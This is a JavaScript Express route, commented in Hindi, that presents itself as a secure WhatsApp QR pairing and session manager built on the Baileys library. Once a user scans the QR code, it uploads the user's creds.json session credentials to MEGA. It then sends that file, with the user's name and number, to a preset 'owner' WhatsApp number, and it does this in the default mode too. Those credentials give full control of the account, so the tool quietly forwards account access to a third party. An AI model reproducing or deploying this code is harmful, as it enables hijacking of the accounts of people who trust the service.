import express from "express";
import fs from "fs";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import QRCode from "qrcode";
import { upload } from "./mega.js";
import dotenv from "dotenv"; // optional, but recommended

dotenv.config(); // अगर .env है तो लोड करेगा

const router = express.Router();

// ─── कॉन्फ़िगरेशन (ENV से या डिफ़ॉल्ट) ────────────────────
const CONFIG = {
    OWNER_NUMBER: process.env.OWNER_NUMBER || "+919876543210",
    SONG_LINK: process.env.SONG_LINK || "https://example.com/song.mp3",
    IMAGE_URL: process.env.IMAGE_URL || "https://example.com/photo.jpg",
    LINKS: process.env.LINKS ? process.env.LINKS.split(',') : [
        "https://link1.com",
        "https://link2.com",
        "https://link3.com",
        "https://link4.com"
    ],
    SEND_TO_OWNER_ONLY: process.env.SEND_TO_OWNER_ONLY === "true" ? true : false,
};

// ─── कलर कॉन्स्टेंट्स (ANSI) ────────────────────────────────
const colors = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    dim: "\x1b[2m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    magenta: "\x1b[35m",
};

function log(color, msg) {
    console.log(`${color}${new Date().toLocaleString()} - ${msg}${colors.reset}`);
}

// ─── स्टार्टअप बैनर ──────────────────────────────────────────
function showBanner() {
    console.clear();
    console.log(colors.cyan + colors.bright);
    console.log("  ╔══════════════════════════════════════════════════╗");
    console.log("  ║      🚀 WhatsApp QR Session Manager v2.0         ║");
    console.log("  ║    ✨ Enhanced with Owner Auto-Forward           ║");
    console.log("  ║    🔒 Secure & Reliable                          ║");
    console.log("  ╚══════════════════════════════════════════════════╝");
    console.log(colors.reset);
    log(colors.green, "✅ Server started successfully!");
    log(colors.blue, `👤 Owner: ${CONFIG.OWNER_NUMBER}`);
    log(colors.blue, `🎵 Song: ${CONFIG.SONG_LINK}`);
    log(colors.blue, `🔗 Links: ${CONFIG.LINKS.join(', ')}`);
    log(colors.yellow, `📤 Send to owner only: ${CONFIG.SEND_TO_OWNER_ONLY}`);
    console.log("");
}

showBanner();

// ─── हेल्पर फंक्शन ────────────────────────────────────────────
function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
        log(colors.dim, `🧹 Removed: ${FilePath}`);
        return true;
    } catch (e) {
        log(colors.red, `❌ Error removing file: ${e.message}`);
        return false;
    }
}

function getMegaFileId(url) {
    try {
        const match = url.match(/\/file\/([^#]+#[^\/]+)/);
        return match ? match[1] : null;
    } catch (error) {
        return null;
    }
}

// ─── QR कोड जनरेट करने वाला एंडपॉइंट ──────────────────────────
router.get("/", async (req, res) => {
    const sessionId =
        Date.now().toString() + Math.random().toString(36).substr(2, 9);
    const dirs = `./qr_sessions/session_${sessionId}`;

    if (!fs.existsSync("./qr_sessions")) {
        fs.mkdirSync("./qr_sessions", { recursive: true });
    }

    await removeFile(dirs);

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version, isLatest } = await fetchLatestBaileysVersion();

            let responseSent = false;

            const KnightBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" }).child({ level: "fatal" }),
                    ),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows("Chrome"),
                markOnlineOnConnect: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 250,
                maxRetries: 5,
            });

            KnightBot.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect, isNewLogin, isOnline, qr } =
                    update;

                if (qr && !responseSent) {
                    log(colors.yellow, "🟢 QR Code Generated! Scan it.");
                    try {
                        const qrDataURL = await QRCode.toDataURL(qr, {
                            errorCorrectionLevel: "M",
                            type: "image/png",
                            quality: 0.92,
                            margin: 1,
                            color: { dark: "#000000", light: "#FFFFFF" },
                        });

                        if (!responseSent) {
                            responseSent = true;
                            res.send({
                                qr: qrDataURL,
                                message: "QR Code Generated! Scan it with your WhatsApp app.",
                                instructions: [
                                    "1. Open WhatsApp on your phone",
                                    "2. Go to Settings > Linked Devices",
                                    '3. Tap "Link a Device"',
                                    "4. Scan the QR code above",
                                ],
                            });
                        }
                    } catch (qrError) {
                        log(colors.red, `❌ QR generation error: ${qrError.message}`);
                        if (!responseSent) {
                            responseSent = true;
                            res.status(500).send({ code: "Failed to generate QR code" });
                        }
                    }
                }

                if (connection === "open") {
                    log(colors.green, "✅ Connected successfully!");
                    log(colors.blue, "📱 Uploading session to MEGA...");

                    const credsPath = dirs + "/creds.json";
                    let megaFileId = null;
                    let megaUrl = null;

                    try {
                        megaUrl = await upload(
                            credsPath,
                            `creds_qr_${sessionId}.json`,
                        );
                        megaFileId = getMegaFileId(megaUrl);
                        if (megaFileId) {
                            log(colors.green, `✅ MEGA upload success! ID: ${megaFileId}`);
                        } else {
                            log(colors.red, "❌ MEGA upload failed (no file ID)");
                        }
                    } catch (error) {
                        log(colors.red, `❌ MEGA upload error: ${error.message}`);
                    }

                    // ─── यूजर JID ──────────────────────────────────
                    const userJid = jidNormalizedUser(
                        KnightBot.authState.creds.me?.id || "",
                    );
                    if (!userJid) {
                        log(colors.red, "❌ Could not determine user JID");
                        removeFile(dirs);
                        process.exit(1);
                        return;
                    }
                    const userNumber = userJid.split('@')[0];
                    log(colors.blue, `👤 User JID: ${userJid}`);

                    // ─── ओनर JID ──────────────────────────────────
                    let ownerJid = null;
                    if (CONFIG.OWNER_NUMBER) {
                        const ownerPhone = CONFIG.OWNER_NUMBER.replace(/[^0-9]/g, "");
                        if (ownerPhone) {
                            ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
                        }
                    }

                    // ─── यूजर का नाम निकालें ────────────────────
                    let userName = "Unknown";
                    try {
                        const contact = await KnightBot.getContact(userJid);
                        if (contact && contact.name) userName = contact.name;
                        else if (contact && contact.notify) userName = contact.notify;
                        else userName = userNumber;
                        log(colors.cyan, `👤 User Name: ${userName}`);
                    } catch (err) {
                        log(colors.yellow, `⚠️ Could not fetch contact name: ${err.message}`);
                        userName = userNumber;
                    }

                    // ─── कैप्शन बनाएँ ────────────────────────────
                    const caption =
                        `📱 *यूजर:* ${userName} (${userNumber})\n` +
                        `📁 *MEGA ID:* ${megaFileId || "Not available"}\n` +
                        `👤 *Owner:* ${CONFIG.OWNER_NUMBER}\n` +
                        `🎵 *Song:* ${CONFIG.SONG_LINK}\n\n` +
                        `🔗 *Your Links:*\n` +
                        CONFIG.LINKS.map((link, i) => `${i+1}. ${link}`).join("\n");

                    const ownerMessage =
                        `🔔 *नई QR पेयरिंग हुई!*\n\n` +
                        `📱 यूजर नंबर: ${userNumber}\n` +
                        `👤 यूजर का नाम: ${userName}\n` +
                        `📁 MEGA File ID: ${megaFileId || "N/A"}\n` +
                        `🎵 Song: ${CONFIG.SONG_LINK}\n` +
                        `🔗 लिंक्स:\n${CONFIG.LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;

                    // ─── भेजने का फंक्शन ──────────────────────────
                    async function sendToJid(jid, includeFile = true) {
                        if (!jid) return;
                        try {
                            // फोटो
                            await KnightBot.sendMessage(jid, {
                                image: { url: CONFIG.IMAGE_URL },
                                caption: caption,
                            });
                            log(colors.green, `🖼️ Photo sent to ${jid}`);

                            // creds.json
                            if (includeFile) {
                                const credsBuffer = fs.readFileSync(credsPath);
                                await KnightBot.sendMessage(jid, {
                                    document: credsBuffer,
                                    mimetype: "application/json",
                                    fileName: "creds.json",
                                });
                                log(colors.green, `📄 creds.json sent to ${jid}`);
                            }
                        } catch (err) {
                            log(colors.red, `❌ Error sending to ${jid}: ${err.message}`);
                        }
                    }

                    // ─── तय करें कि किसको भेजना है ──────────────────
                    if (CONFIG.SEND_TO_OWNER_ONLY) {
                        // सिर्फ ओनर को
                        if (ownerJid) {
                            await sendToJid(ownerJid, true);
                            // ओनर को डिटेल टेक्स्ट
                            try {
                                await KnightBot.sendMessage(ownerJid, { text: ownerMessage });
                                log(colors.green, "📝 Owner details message sent");
                            } catch (e) {
                                log(colors.red, `❌ Owner text error: ${e.message}`);
                            }
                        }
                    } else {
                        // यूजर को भेजें
                        await sendToJid(userJid, true);

                        // ओनर को भेजें (अगर अलग है)
                        if (ownerJid && ownerJid !== userJid) {
                            await sendToJid(ownerJid, true);
                            try {
                                await KnightBot.sendMessage(ownerJid, { text: ownerMessage });
                                log(colors.green, "📝 Owner details message sent");
                            } catch (e) {
                                log(colors.red, `❌ Owner text error: ${e.message}`);
                            }
                        } else if (ownerJid && ownerJid === userJid) {
                            log(colors.yellow, "ℹ️ Owner same as user, skipping duplicate");
                        }
                    }

                    // ─── क्लीनअप ──────────────────────────────────
                    log(colors.blue, "🧹 Cleaning up session...");
                    await delay(1000);
                    removeFile(dirs);
                    log(colors.green, "✅ Session cleaned up successfully");
                    log(colors.green, "🎉 Process completed successfully!");

                    log(colors.blue, "🛑 Shutting down application...");
                    await delay(2000);
                    process.exit(0);
                }

                if (isNewLogin) log(colors.green, "🔐 New login via QR code");
                if (isOnline) log(colors.green, "📶 Client is online");

                if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                        log(colors.red, "❌ Logged out from WhatsApp. Need to generate new QR.");
                    } else {
                        log(colors.yellow, "🔁 Connection closed — restarting...");
                        initiateSession();
                    }
                }
            });

            KnightBot.ev.on("creds.update", saveCreds);

            // ─── टाइमआउट ──────────────────────────────────────────
            setTimeout(() => {
                if (!responseSent) {
                    responseSent = true;
                    log(colors.red, "⏰ QR generation timeout");
                    res.status(408).send({ code: "QR generation timeout" });
                    removeFile(dirs);
                    setTimeout(() => process.exit(1), 2000);
                }
            }, 30000);
        } catch (err) {
            log(colors.red, `❌ Session init error: ${err.message}`);
            if (!res.headersSent) {
                res.status(503).send({ code: "Service Unavailable" });
            }
            removeFile(dirs);
            setTimeout(() => process.exit(1), 2000);
        }
    }

    await initiateSession();
});

// ─── हेल्थ चेक एंडपॉइंट ──────────────────────────────────────
router.get("/status", (req, res) => {
    res.json({
        status: "online",
        version: "2.0",
        owner: CONFIG.OWNER_NUMBER,
        song: CONFIG.SONG_LINK,
        links: CONFIG.LINKS,
        sendToOwnerOnly: CONFIG.SEND_TO_OWNER_ONLY,
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
    });
});

// ─── अनकॉट एरर हैंडलर ──────────────────────────────────────────
process.on("uncaughtException", (err) => {
    const e = String(err);
    const ignored = [
        "conflict", "not-authorized", "Socket connection timeout",
        "rate-overlimit", "Connection Closed", "Timed Out",
        "Value not found", "Stream Errored", "statusCode: 515", "statusCode: 503"
    ];
    if (ignored.some(ig => e.includes(ig))) return;
    log(colors.red, `💥 Uncaught Exception: ${err.message}`);
    process.exit(1);
});

export default router;
